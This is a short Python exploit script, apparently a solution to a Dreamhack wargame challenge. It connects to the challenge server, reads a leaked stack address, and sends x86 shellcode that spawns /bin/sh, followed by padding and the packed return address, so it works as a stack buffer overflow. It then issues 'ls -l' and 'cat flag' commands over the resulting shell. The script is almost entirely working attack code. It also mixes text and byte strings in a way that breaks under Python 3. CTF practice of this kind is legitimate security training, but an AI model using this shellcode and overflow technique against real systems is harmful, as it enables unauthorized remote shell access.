import socket
import struct

X=socket.socket()
X.connect(("host1.dreamhack.games",14551))


data=str(X.recv(7))
print(data)
data=X.recv(10)
print(data)
data=int(data,16)
print(data)
data=struct.pack("<L",data)
print(data)

payload='\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'+"A"*106+data
X.sendall(payload)
print(payload)
X.sendall('ls -l\n'.encode())
print(X.recv(0x100))
X.sendall('ls -l\n'.encode())
print(X.recv(0x100))
X.sendall('ls -l\n'.encode())
print(X.recv(0x100))

X.sendall('cat flag\n'.encode())
print(X.recv(0x100))


